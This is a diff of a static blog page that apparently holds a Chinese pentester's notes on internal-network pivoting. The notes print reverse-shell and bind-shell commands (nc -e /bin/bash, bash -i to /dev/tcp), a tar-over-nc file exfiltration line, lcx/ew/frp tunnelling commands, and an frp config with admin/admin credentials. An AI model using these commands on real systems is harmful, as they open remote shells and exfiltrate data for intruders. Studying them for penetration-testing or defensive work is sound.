@@ -2,7 +2,7 @@
 <html lang="en">
 
 <!-- Head tag -->
-<head><meta name="generator" content="Hexo 3.8.0">
+<head>
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -25,14 +25,20 @@
     <link rel="canonical" href="https://pengpengp.github.io/2019/03/10/内网穿透工具/">
 
     <!-- Bootstrap Core CSS -->
-    <link rel="stylesheet" href="/css/bootstrap.min.css">
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+
 
     <!-- Custom CSS -->
-    <link rel="stylesheet" href="/css/blog-style.css">
+    
+<link rel="stylesheet" href="/css/blog-style.css">
+
 
     <!-- Pygments Github CSS -->
-    <link rel="stylesheet" href="/css/syntax.css">
-</head>
+    
+<link rel="stylesheet" href="/css/syntax.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
 
 <style>
 
@@ -43,8 +49,8 @@
 <!-- hack iOS CSS :active style -->
 <body ontouchstart="" class="animated fadeIn">
 <!-- Navigation -->
-<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost="true" data-istags="false
-" data-ishome="false">
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost = "true" data-istags="false
+" data-ishome = "false" >
     <div class="container-fluid">
         <!-- Brand and toggle get grouped for better mobile display -->
         <div class="navbar-header page-scroll">
@@ -119,7 +125,8 @@
 <!--only post-->
 
 
-<img class="wechat-title-img" src="">
+<img class="wechat-title-img"
+     src="">
 
 
 <style>
@@ -146,7 +153,8 @@
                     </span>
                     <div class="tags text-center">
                         
-                        <a class="tag" href="/tags/#内网转发" title="内网转发">内网转发</a>
+                        <a class="tag" href="/tags/#内网转发"
+                           title="内网转发">内网转发</a>
                         
                     </div>
                 </div>
@@ -167,15 +175,15 @@
             <!-- Post Container -->
             <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
                 <h2 id="内网转发的三种：反弹shell、反弹端口、反弹代理"><a href="#内网转发的三种：反弹shell、反弹端口、反弹代理" class="headerlink" title="内网转发的三种：反弹shell、反弹端口、反弹代理"></a>内网转发的三种：反弹shell、反弹端口、反弹代理</h2><p>虚拟终端和bash -i的区别：</p>
-<pre><code>bash -i是交互式的shell，很多程序都要求用交互式shell
-</code></pre><h1 id="一。反弹shell"><a href="#一。反弹shell" class="headerlink" title="一。反弹shell"></a>一。反弹shell</h1><blockquote>
+<pre><code>bash -i是交互式的shell，很多程序都要求用交互式shell</code></pre>
+<h1 id="一。反弹shell"><a href="#一。反弹shell" class="headerlink" title="一。反弹shell"></a>一。反弹shell</h1><blockquote>
 <p>nc的使用：</p>
 </blockquote>
 <p>有两种方式：</p>
 <p>1.被动连接(让被攻击者反弹到监听)<br>    powershell中反弹命令：<br>    <code>nc ip port -e cmd.exe</code><br>    <code>nc ip port -e /bin/bash</code><br>    <code>bash -i &gt;&amp;/dev/tcp/ip/port 0&gt;&amp;1</code></p>
 <p><code>监听nc -lnvp port</code></p>
-<p>2.主动连接(主动连接被攻击者)<br>    特点：攻击者不需要公网ip，但是被攻击的服务器必须在公网上<br>    被攻击：<br>    <code>nc -lnvp port -e cmd</code><br>    <code>nc -lnvp port -e /bin/bash</code><br>    攻击：<br>    <code>nc ip port</code></p>
-<p>还有其他反弹的方式：如perl、php、python语言反弹<br><a href="http://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html" target="_blank" rel="noopener">http://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html</a></p>
+<p>2.主动连接(主动连接被攻击者)<br>    特点：攻击者不需要公网ip，但是被攻击的服务器必须在公网上<br>    被攻击：<br>    <code>nc -lnvp port -e cmd </code><br>    <code>nc -lnvp port -e /bin/bash</code><br>    攻击：<br>    <code>nc ip port</code></p>
+<p>还有其他反弹的方式：如perl、php、python语言反弹<br><a target="_blank" rel="noopener" href="http://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html">http://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html</a></p>
 <h1 id="二。反弹端口"><a href="#二。反弹端口" class="headerlink" title="二。反弹端口"></a>二。反弹端口</h1><p>流程：A出-&gt;B入-&gt;B出-&gt;C入（A为攻击者、B为getshell机器、C为内网被攻击者）    </p>
 <p>工具：lcx(windows)、frp</p>
 <blockquote>
@@ -187,15 +195,25 @@ lcx -listen 4444 12345
 lcx.exe –slave 公网 IP + 端口 被控服务器IP + 端口
 lcx -slave 1.1.1.1 4444 127.0.0.1 80
 步骤三：在外网服务器连接本地12345端口
-然后mstsc 127.0.0.1:12345
-</code></pre><blockquote>
+然后mstsc 127.0.0.1:12345</code></pre>
+<blockquote>
 <p>用nc进行文件传输:</p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">A:`tar cfz - 文件名 | nc 10.0.1.162 9995`</span><br><span class="line">B:`nc -l 21000 | tar zxvf -`</span><br><span class="line"></span><br><span class="line">nc的使用:https://www.cnblogs.com/nmap/p/6148306.html</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">A:&#96;tar cfz - 文件名 | nc 10.0.1.162 9995&#96;</span><br><span class="line">B:&#96;nc -l 21000 | tar zxvf -&#96;</span><br><span class="line"></span><br><span class="line">nc的使用:https:&#x2F;&#x2F;www.cnblogs.com&#x2F;nmap&#x2F;p&#x2F;6148306.html</span><br></pre></td></tr></table></figure>
+
+
+
+
+
 <blockquote>
 <p>frp的使用</p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">frpc.ini</span><br><span class="line">[common]</span><br><span class="line">bind_addr=0.0.0.0</span><br><span class="line">bind_port = 7000</span><br><span class="line">auto_token=12345678（密码可以自己修改）</span><br><span class="line"></span><br><span class="line">dashboard_port = 7500（网页登录端口）</span><br><span class="line">dashboard_user = admin（网页登录账户）</span><br><span class="line">dashboard_pwd = admin（网页登录密码）</span><br><span class="line">https://www.atsurak.com/frp-windows-rdp/</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">frpc.ini</span><br><span class="line">[common]</span><br><span class="line">bind_addr&#x3D;0.0.0.0</span><br><span class="line">bind_port &#x3D; 7000</span><br><span class="line">auto_token&#x3D;12345678（密码可以自己修改）</span><br><span class="line"></span><br><span class="line">dashboard_port &#x3D; 7500（网页登录端口）</span><br><span class="line">dashboard_user &#x3D; admin（网页登录账户）</span><br><span class="line">dashboard_pwd &#x3D; admin（网页登录密码）</span><br><span class="line">https:&#x2F;&#x2F;www.atsurak.com&#x2F;frp-windows-rdp&#x2F;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
 <blockquote>
 <p>常见要扫描的端口：</p>
 </blockquote>
@@ -224,8 +242,8 @@ lcx -slave 1.1.1.1 4444 127.0.0.1 80
 </ul>
 <ul>
 <li>第2种方式.在攻击者和被攻击者服务器使用<pre><code>攻击者：ew -s rcsocks -l 1080 -e 6666
-被攻击方：ew -s rssocks -d 192.168.11.123 -e 6666
-</code></pre></li>
+被攻击方：ew -s rssocks -d 192.168.11.123 -e 6666</code></pre>
+</li>
 </ul>
 <p>多层内网穿透：</p>
 <p>假设win2008R2在内网[无公网ip]并在一个独立的内网段,win2008也处在目标内网,假设在另一个内网段,centos 5.1同样也处在内网,可又在另一个单独的内网段且win2008R2能访问win2008,win2008能访问centos 5.1,而centos 5.1能访问目标核心网,要实现层层穿透,访问到核心网资源,我们就可以这样</p>
@@ -251,12 +269,14 @@ lcx -slave 1.1.1.1 4444 127.0.0.1 80
                 <ul class="pager">
                     
                     <li class="previous">
-                        <a href="/2019/03/16/常用渗透工具/" data-toggle="tooltip" data-placement="top" title="常用渗透工具">&larr; Previous Post</a>
+                        <a href="/2019/03/16/常用渗透工具/" data-toggle="tooltip" data-placement="top"
+                           title="常用渗透工具">&larr; Previous Post</a>
                     </li>
                     
                     
                     <li class="next">
-                        <a href="/2019/03/03/提权/" data-toggle="tooltip" data-placement="top" title="提权">Next Post &rarr;</a>
+                        <a href="/2019/03/03/提权/" data-toggle="tooltip" data-placement="top"
+                           title="提权">Next Post &rarr;</a>
                     </li>
                     
                 </ul>
@@ -275,8 +295,8 @@ lcx -slave 1.1.1.1 4444 127.0.0.1 80
 
             <div class="hidden-xs col-sm-3 toc-col">
                 <div class="toc-wrap">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#内网转发的三种：反弹shell、反弹端口、反弹代理"><span class="toc-text">内网转发的三种：反弹shell、反弹端口、反弹代理</span></a></li></ol><li class="toc-item toc-level-1"><a class="toc-link" href="#一。反弹shell"><span class="toc-text">一。反弹shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#二。反弹端口"><span class="toc-text">二。反弹端口</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#三。反弹代理"><span class="toc-text">三。反弹代理</span></a>
-                </li></div>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E8%BD%AC%E5%8F%91%E7%9A%84%E4%B8%89%E7%A7%8D%EF%BC%9A%E5%8F%8D%E5%BC%B9shell%E3%80%81%E5%8F%8D%E5%BC%B9%E7%AB%AF%E5%8F%A3%E3%80%81%E5%8F%8D%E5%BC%B9%E4%BB%A3%E7%90%86"><span class="toc-text">内网转发的三种：反弹shell、反弹端口、反弹代理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%82%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">一。反弹shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%82%E5%8F%8D%E5%BC%B9%E7%AB%AF%E5%8F%A3"><span class="toc-text">二。反弹端口</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%82%E5%8F%8D%E5%BC%B9%E4%BB%A3%E7%90%86"><span class="toc-text">三。反弹代理</span></a>
+                </div>
             </div>
         </div>
 
@@ -327,11 +347,11 @@ lcx -slave 1.1.1.1 4444 127.0.0.1 80
 
                 </ul>
                 <p class="copyright text-muted">
-                    Copyright &copy; pengpengp&#39;s BLOG 2019
+                    Copyright &copy; pengpengp&#39;s BLOG 2020
                     <br>
                     <span id="busuanzi_container_site_pv" style="font-size: 12px;">PV: <span id="busuanzi_value_site_pv"></span> Times</span>
                     <br>
-                    Theme by <a href="https://haojen.github.io/">Haojen Ma</a>
+                    Theme by <a target="_blank" rel="noopener" href="https://haojen.github.io/">Haojen Ma</a>
                 </p>
 
             </div>
@@ -340,13 +360,19 @@ lcx -slave 1.1.1.1 4444 127.0.0.1 80
 </footer>
 
 <!-- jQuery -->
+
 <script src="/js/jquery.min.js"></script>
 
+
 <!-- Bootstrap Core JavaScript -->
+
 <script src="/js/bootstrap.min.js"></script>
 
+
 <!-- Custom Theme JavaScript -->
+
 <script src="/js/blog.js"></script>
+
 
 <!-- async load function -->
 <script>
